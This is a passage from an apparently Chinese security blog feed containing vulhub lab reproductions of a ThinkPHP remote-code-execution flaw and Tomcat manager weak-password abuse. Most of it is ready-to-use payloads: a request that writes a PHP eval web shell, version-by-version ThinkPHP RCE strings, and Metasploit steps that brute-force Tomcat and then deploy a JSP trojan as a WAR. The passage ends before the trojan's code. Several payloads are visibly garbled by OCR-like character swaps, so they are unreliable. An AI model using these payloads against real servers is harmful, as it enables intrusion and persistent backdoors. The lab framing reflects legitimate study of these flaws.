&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;?php eval($_POST[aaa]); ?&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">shell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095644.png" alt="image.png">&lt;br>
&lt;strong>上蚂剑&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/shell.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：aaa
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095726.png" alt="image.png">&lt;br>
&lt;strong>成功&lt;/strong>&lt;br>
&lt;strong>做完实验后关闭环境 docker-compose down&lt;/strong>&lt;/p>
&lt;h1 id="更多版本">更多版本&lt;/h1>
&lt;p>漏洞触发点和版本的不同，所以payload也不⼀样,条件也不⼀样&lt;br>
5.0.13~5.0.19默认情况下config中的app_debug配置项为false。&lt;br>
复现的时候需要开启这个&lt;br>
&lt;strong>总结⼀下 5.1.x ：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkRequest&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">pwd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkviewdriverPhp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">dispLay&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="n">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinktempLatedriverfiLe&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">cacheFiLe&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sheLL&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="err">?&lt;/span> &lt;span class="n">php&lt;/span> &lt;span class="n">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkContainer&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">var&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>5.0.x ：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkconfig&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">database&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">username&lt;/span> &lt;span class="c1"># 获取配置信息&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkLang&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Load&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLe&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">jpg&lt;/span> &lt;span class="c1"># 包含任意⽂件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkConfig&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Load&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLe&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="c1"># 包含任意.php⽂件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>5.0.13：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;php.LocaL/thinkphp5.8.5/pubLic/index.php?s=index &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">方法：&lt;/span>&lt;span class="n">post&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Body内容&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">phpinfo&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">GET&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>其他&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.f3 POST /?s=index/index&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.23、5.f.8 ≤ 5.f.f6 需要开启框架app_debug &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span> &lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">aL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ThinkPHP ≤ 5.8.23 需要存在xxx的method路由，例如captcha&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">POST&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">xxx&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">f&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Ls&lt;/span>&lt;span class="o">+-&lt;/span>&lt;span class="n">aL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">_construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">L&lt;/span> &lt;span class="n">s&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Tomacat漏洞复现】后台弱口令+文件上传</title><link>http://localhost:1313/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/tomacat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid><description>&lt;img src="http://localhost:1313/images/35.webp" alt="Featured image of post 【Tomacat漏洞复现】后台弱口令+文件上传" />&lt;h1 id="影响范围">影响范围&lt;/h1>
&lt;p>Tomcat8&lt;/p>
&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>这边就还是用vulhub进行复现&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub-master/tomcat/tomcat8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141819.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>这里使用MSF进行复现：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msfconsole
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141926.png" alt="image.png">&lt;br>
&lt;strong>查找与 tomcat 相关的模块&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">search tomcat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>使用 auxiliary/scanner/http/tomcat_mgr_login 模块&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/http/tomcat_mgr_login
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>查看需要填写哪些参数&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">show options
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>将 rhosts 设置为目标机&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">set rhosts 172.16.2.174
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>进行爆破&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904142741.png" alt="image.png">&lt;br>
这里成功爆破出账号/密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">[+] 192.168.197.140:8080 - Login Successful: tomcat:tomcat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>点击 Manager App 进行登录&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155742.png" alt="image.png">&lt;br>
&lt;strong>登录后找到上传点&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155816.png" alt="image.png">&lt;br>
将带有一句话的111.jsp文件压缩成zip，并且将压缩后的zip文件改名为111.war&lt;br>
jsp 一句话木马，密码为123&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
